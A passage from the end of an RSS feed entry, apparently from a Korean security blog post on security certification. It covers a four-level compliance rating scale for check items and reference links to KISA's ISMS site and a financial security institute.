&#xBCF4;&#xD638;&#xC870;&#xCE58; (15&#xAC1C;)</li></ol></li><li><p>&#xC810;&#xAC80;&#xD56D;&#xBAA9;&#xBCC4; &#xC900;&#xC218;&#xC815;&#xB3C4;&#xB97C; <strong>&#x2460; &#xC774;&#xD589; &#x2461; &#xBD80;&#xBD84;&#xC774;&#xD589; &#x2462; &#xBBF8;&#xC774;&#xD589; &#x2463; &#xD574;&#xB2F9;&#xC5C6;&#xC74C;</strong> 4&#xB2E8;&#xACC4;&#xB85C; &#xAD6C;&#xBD84;&#xD558;&#xC5EC; &#xD3C9;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ul></li></ul><h3 id="&#xCC38;&#xACE0;-&#xC790;&#xB8CC;"><a href="#&#xCC38;&#xACE0;-&#xC790;&#xB8CC;" class="headerlink" title="&#xCC38;&#xACE0; &#xC790;&#xB8CC;"></a>&#xCC38;&#xACE0; &#xC790;&#xB8CC;</h3><p><a href="https://isms.kisa.or.kr/main/">&#xD55C;&#xAD6D;&#xC778;&#xD130;&#xB137;&#xC9C4;&#xD765;&#xC6D0;(KISA)</a></p><p><a href="https://www.fsec.or.kr/bbs/1007">https://www.fsec.or.kr/bbs/1007</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/Certification/">Certification</category>
      
      
      <comments>https://hackyboiz.github.io/2024/07/07/romi0x/certification_security/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
